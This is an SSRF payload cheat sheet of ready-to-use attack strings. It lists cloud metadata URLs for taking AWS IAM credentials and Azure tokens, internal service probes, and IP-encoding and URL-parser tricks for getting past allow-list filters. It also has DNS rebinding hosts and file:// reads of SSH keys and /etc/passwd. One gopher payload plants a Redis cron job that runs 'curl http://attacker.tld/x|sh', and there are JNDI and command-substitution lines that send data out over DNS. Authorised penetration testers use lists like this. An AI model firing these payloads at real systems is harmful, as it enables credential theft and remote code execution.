# PAYLOADS: SSRF — Bypasses & Targets
## Version: 1.0 | Domain: payloads

---

## CLOUD METADATA
```
http://169.254.169.254/latest/meta-data/                                       # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/user-data/
http://[fd00:ec2::254]/latest/meta-data/                                       # IMDS over IPv6
http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json    # GCP — needs Metadata-Flavor: Google
http://169.254.169.254/computeMetadata/v1/                                      # GCP via IP
http://metadata/computeMetadata/v1/                                             # GCP shortcut
http://169.254.169.254/metadata/instance?api-version=2021-02-01                # Azure — needs Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://100.100.100.200/latest/meta-data/                                        # Alibaba
http://169.254.169.254/openstack/latest/                                        # OpenStack
http://192.0.0.192/latest/                                                       # Oracle Cloud
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role     # AWS w/ guessed role
http://169.254.169.254/latest/api/token (PUT, header: X-aws-ec2-metadata-token-ttl-seconds:21600)   # IMDSv2
```

## INTERNAL SERVICES
```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://[::ffff:7f00:1]
http://localhost:6379           # Redis
http://localhost:9200           # Elasticsearch
http://localhost:8500/v1/agent/self  # Consul
http://localhost:5984/_all_dbs   # CouchDB
http://localhost:27017           # Mongo (HTTP probe limited)
http://localhost:11211           # Memcached
http://localhost:5601            # Kibana
http://localhost:8080/manager/html  # Tomcat
http://localhost:50070            # Hadoop NameNode
http://localhost:9000             # SonarQube / portainer
http://localhost:80/server-status # Apache
http://localhost:80/server-info
http://localhost:5000             # Flask default
http://localhost:3000             # Node default
http://localhost:8000             # Django default
http://localhost/actuator/env     # Spring Boot
http://localhost/actuator/heapdump  # Heap dump
http://localhost:9090/api/v1/query?query=up  # Prometheus
```

## IP-ENCODING BYPASSES
```
http://127.1                       # short
http://127.0.1
http://0
http://0.0.0.0                      # all-zeros
http://0177.0.0.1                   # octal
http://0x7f.0.0.1                   # hex
http://2130706433                   # decimal
http://3232235521                   # 192.168.0.1 decimal
http://0x7f000001                   # hex of full
http://017700000001                 # octal full
http://[::ffff:127.0.0.1]            # IPv4-mapped IPv6
http://[::ffff:7f00:1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://①②⑦.0.0.1                  # Unicode digit confusion (rare success)
http://127。0。0。1                  # CJK fullwidth period
http://127．0．0．1
```

## URL-PARSER CONFUSION
```
http://allowed.com\\@attacker.tld/
http://allowed.com\\.attacker.tld/
http://allowed.com#@attacker.tld/
http://allowed.com?@attacker.tld/
http://allowed.com.attacker.tld/                  # subdomain trick
http://attacker.tld/.allowed.com/                  # path trick
http://attacker.tld%23.allowed.com/
http://attacker.tld%252f.allowed.com/
http://[email protected]/
http://allowed.com:80@attacker.tld
http://allowed.com.attacker.tld/                   # if check is "ends-with"
```

## DNS REBINDING
```
1.1.1.1.1time.169.254.169.254.repeat.rbndr.us
make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms
# rebinder.it / lock.cmpxchg8b.com
```

## SCHEME-BASED
```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp
file:///root/.ssh/id_rsa
file:///var/log/auth.log
file:///c:/windows/win.ini

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0aA%0d%0a$57%0d%0a%0a%0a*/1 * * * * curl http://attacker.tld/x|sh%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a%0d%0a

dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats

ldap://127.0.0.1:389/
ldaps://127.0.0.1:636/

ftp://attacker.tld/x

netdoc:///etc/passwd
jar:http://attacker.tld/x.zip!/

php://filter/convert.base64-encode/resource=/etc/passwd
phar://attacker.zip/x.txt
```

## BLIND SSRF EXFIL VIA DNS
```
http://$(whoami).attacker.tld/
http://${jndi:dns://attacker.tld/x}
http://x.{{burp-collaborator}}.com/
http://canary123.attacker.tld/
```

## IPV6 SCOPED
```
http://[::1]:80/
http://[fd00:ec2::254]/
http://[2001:db8::1]/
```

## REFERENCES
SSRF Bible (Wallarm), gopherus, smbmap (rebind), PortSwigger SSRF cheat sheet
